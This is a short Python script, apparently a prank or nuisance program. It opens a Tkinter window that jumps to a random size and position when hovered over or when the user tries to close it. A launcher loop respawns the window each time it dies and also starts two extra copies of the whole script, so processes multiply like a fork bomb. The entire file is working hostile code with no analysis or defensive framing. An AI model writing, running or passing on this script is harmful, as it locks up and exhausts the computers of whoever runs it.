#/usr/bin/env python
# -*- coding: utf8 -*-
try: 
	import Tkinter as t;
except:
	import tkinter as t;
from random import randrange;
import sys;
import subprocess;
if not "CAFEDEAD" in sys.argv:
	sp = subprocess.Popen(["python.exe", "-O",__file__, "CAFEDEAD"] + sys.argv[1:], shell=False)
	while True:
		sp.wait();
		sp = subprocess.Popen(["python.exe", "-O",__file__, "CAFEDEAD"] + sys.argv[1:], shell=False)
		subprocess.Popen(["python.exe", "-O",__file__] + sys.argv[1:], shell=False)
		subprocess.Popen(["python.exe", "-O",__file__] + sys.argv[1:], shell=False)
root = t.Tk();
e = lambda event: root.geometry(str(randrange(400)) + "x" + str(randrange(400)) + "+" + str(randrange(1000)) + "+" + str(randrange(1000)))
root.bind("<Enter>", e);
root.protocol("WM_DELETE_WINDOW", e);
root.mainloop();
